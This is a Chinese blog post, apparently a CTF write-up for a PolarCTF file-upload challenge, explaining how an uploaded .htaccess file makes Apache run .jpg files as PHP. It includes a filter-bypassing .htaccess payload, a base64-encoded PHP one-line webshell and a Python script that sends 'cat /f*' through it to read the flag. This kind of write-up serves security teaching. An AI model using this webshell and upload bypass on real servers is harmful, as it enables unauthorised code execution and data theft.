
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/Acc1oFl4g/p/18920291" title="发布于 2025-06-09 10:22">
    <span role="heading" aria-level="2">对apache服务器环境下利用.htaccess配置文件完成文件上传的理解</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="对apache服务器环境下利用htaccess配置文件完成文件上传的理解">对apache服务器环境下利用.htaccess配置文件完成文件上传的理解</h1>
<p><code>.htaccess</code> 文件是 Apache Web 服务器中的配置文件，用于控制服务器的行为。其格式非常简单，通常由一系列指令和规则组成</p>
<p>我们这里可以利用的就是把别的格式的文件当作php文件来执行</p>
<pre><code>AddType application/x-httpd-php .jpg
</code></pre>
<ol>
<li><strong><code>AddType</code></strong>：
<ul>
<li><code>AddType</code> 是 Apache 配置指令，用于为特定的文件扩展名指定 MIME 类型。MIME 类型（Multipurpose Internet Mail Extensions）用于指示浏览器如何处理某种类型的文件。</li>
</ul>
</li>
<li><strong><code>application/x-httpd-php</code></strong>：
<ul>
<li><code>application/x-httpd-php</code> 是指定的 MIME 类型。在这里，它表示文件将被作为 PHP 脚本来处理。</li>
<li>正常情况下，PHP 文件的 MIME 类型通常是 <code>application/x-httpd-php</code>，这意味着该文件应由 PHP 解析器处理，而不是由浏览器直接下载或展示。</li>
</ul>
</li>
<li><strong><code>.jpg</code></strong>：
<ul>
<li><code>.jpg</code> 是目标文件的扩展名。在此指令中，它表示所有以 <code>.jpg</code> 结尾的文件。</li>
</ul>
</li>
</ol>
<p><strong>整体作用</strong></p>
<p>当这条指令被包含在 <code>.htaccess</code> 文件或 Apache 配置中时，它的效果是：</p>
<ul>
<li>任何请求后缀为 <code>.jpg</code> 的文件将被 Apache 服务器视作 PHP 文件进行处理。这意味着即使文件的扩展名是 <code>.jpg</code>，服务器仍然会将其当作 PHP 脚本执行，而不是作为普通的图像文件返回。</li>
</ul>
<h2 id="例题-polarctf-困难-上传">例题 polarctf 困难 上传</h2>
<p>回到这道题，明白了htaccess的用法之后我们就可以传马了</p>
<p>script头可以绕过对&lt;?的过滤，但是在php7之后这些标签都被移除了，因此可以采取编码的方式绕过，将我们要上传的一句话木马使用base64编码后进行上传</p>
<p>php肯定没法解析base64编码后的代码，所以在执行前需要进行base64解码，这里同样需要利用htaccess进行解码</p>
<pre><code>php_value auto_append_file "php://filter/read=convert.base64-decode/resource=yjh.jpg"
</code></pre>
<ol>
<li><strong><code>php_value</code></strong>：
<ul>
<li><code>php_value</code> 是一种指令，通常在 Apache 的 <code>.htaccess</code> 文件中使用，用于设置 PHP 的配置选项。这允许用户在特定目录下更改某些 PHP 设置，而不必修改全局的 <code>php.ini</code> 文件。</li>
</ul>
</li>
<li><strong><code>auto_append_file</code></strong>：
<ul>
<li><code>auto_append_file</code> 是一个 PHP 配置选项，用于指定在每个脚本执行完毕后自动附加的文件。这意味着在每个 PHP 脚本结束时，指定的文件内容将被添加到输出中。</li>
</ul>
</li>
<li><strong><code>"php://filter/read=convert.base64-decode/resource=yjh.jpg"</code></strong>：
<ul>
<li>这是一个特殊的流路径，使用了php:filter这个协议。具体来说，它做了以下几件事情：
<ul>
<li><strong><code>read=convert.base64-decode</code></strong>：这是一个过滤器，指示 PHP 在读取文件时，对其执行 Base64 解码。即该路径会将文件的内容视作 Base64 编码的内容进行解码。</li>
<li><strong><code>resource=yjh.jpg</code></strong>：这是要读取的资源，这里指定的文件是 <code>yjh.jpg</code>，即该 JPEG 文件。</li>
</ul>
</li>
</ul>
</li>
</ol>
<p><strong>整体作用</strong></p>
<p>通过设置 <code>auto_append_file</code> 为这个流路径，PHP 在处理每个请求时：</p>
<ul>
<li>在执行完 PHP 脚本后，自动读取指定的 JPEG 文件 (<code>yjh.jpg</code>)，并对其内容进行 Base64 解码。</li>
<li>将解码后的内容附加到最终的输出中。</li>
</ul>
<h3 id="这里还要注意一个问题">这里还要注意一个问题</h3>
<p>由于本题过滤了文件内容中的file，所以我们需要利用反斜杠加换行绕过file过滤</p>
<p>在 PHP 和许多编程语言或配置文件中，反斜杠（<code>\</code>）可以用作行续符，允许将一条指令拆分为多行书写。这种方式可以在代码或配置中增强可读性，但是在某些情况下，它也可以作为一种简单的“绕过”机制，避免触发特定文本的过滤或识别。</p>
<p>通过在 <code>file</code> 和其后内容之间插入反斜杠并换行，关键词 <code>file</code> 被拆分为两部分，使得过滤机制不再能识别完整的 <code>file</code> 这个关键词。</p>
<p>例如，<code>php_value auto_append_fi\</code> 作为一行，<code>\le</code> 在下一行，其实是在继续前一行的内容，从而构成了 <code>auto_append_file</code>。<strong>由于过滤机制只检测单行</strong>，因此无法判断 <code>file</code> 是整个关键词的一部分。</p>
<pre><code>php_value auto_append_fi\
le
</code></pre>
<p>至此本题思路结束</p>
<h3 id="上传htaccess文件">上传htaccess文件</h3>
<pre><code>AddType application/x-httpd-php .jpg
php_value auto_append_fi\
le "php://filter/convert.base64-decode/resource=yjh.jpg"
</code></pre>
<h3 id="上传base64编码后的一句话马文件">上传base64编码后的一句话马文件</h3>
<pre><code>PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4=
</code></pre>
<p>上传，访问/upload/yjh.jpg，传参，拿到flag</p>
<h3 id="exp">Exp</h3>
<pre><code class="language-python">import requests
url='http://949c4480-402d-40c7-8119-4af0266f6c9e.www.polarctf.com:8090/upload/yjh.jpg'
data={'a':'system("cat /f*");'}
r=requests.post(url,data=data)
print(r.text)</code></pre>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2025-06-09 10:22">2025-06-09 10:22</span>&nbsp;
<a href="https://www.cnblogs.com/Acc1oFl4g">Acc1oFl4g</a>&nbsp;
阅读(<span id="post_view_count">38</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18920291);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18920291', targetLink: 'https://www.cnblogs.com/Acc1oFl4g/p/18920291', title: '对apache服务器环境下利用.htaccess配置文件完成文件上传的理解' })">举报</a>
</div>
        